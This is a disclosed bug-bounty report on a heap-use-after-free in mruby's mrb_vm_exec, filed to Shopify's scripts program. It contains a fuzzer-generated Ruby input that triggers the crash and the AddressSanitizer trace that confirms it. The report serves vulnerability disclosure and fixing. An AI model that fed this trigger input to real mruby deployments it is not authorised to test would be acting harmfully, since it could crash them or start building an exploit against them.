# heap-use-after-free in mrb_vm_exec - vm.c:1247

## Report Details
- **Report ID**: 222294
- **URL**: https://hackerone.com/reports/222294
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-19T22:17:20.987Z
- **Disclosed**: 2017-05-21T14:03:23.319Z

## Reporter
- **Username**: ilsani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Following input causes a heap-use-after-free in `mrb_vm_exec` (vm.c:1247):
```
g=0.times.p{}
a %w{0 0 0 0 0 0 0 0 0 0
0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0
0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 { 0 } 0 0 0 0 0 0 0 0 0
0 0 0
0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 } 0}.(&:e)
```
```
==3480==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e0c0 at pc 0x0000004385b1 bp 0x7ffd93156930 sp 0x7ffd9315692
8                                                                
WRITE of size 8 at 0x61d00001e0c0 thread T0                         
    #0 0x4385b0 in mrb_vm_exec /tmp/mruby/src/vm.c:1247
    #1 0x4407f9 in mrb_vm_run /tmp/mruby/src/vm.c:854
    #2 0x4407f9 in mrb_top_run /tmp/mruby/src/vm.c:2705
    #3 0x58652d in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:
5780                         
    #4 0x403bbe in main /tmp/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:2
47                           
    #5 0x7f52c49752b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #6 0x402e19 in _start (/home/debian/work/fuzz/mruby/fuzz/20170419/mruby+0x402e19)
                             
0x61d00001e0c0 is located 64 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)
freed by thread T0 here:     
    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)
    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202
    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216
                             
previously allocated by thread T0 here:
    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)
    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202
    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216

SUMMARY: AddressSanitizer: heap-use-after-free /tmp//mruby/src/vm.c:1247 in mrb_vm_exec
```

## Attachments
No attachments
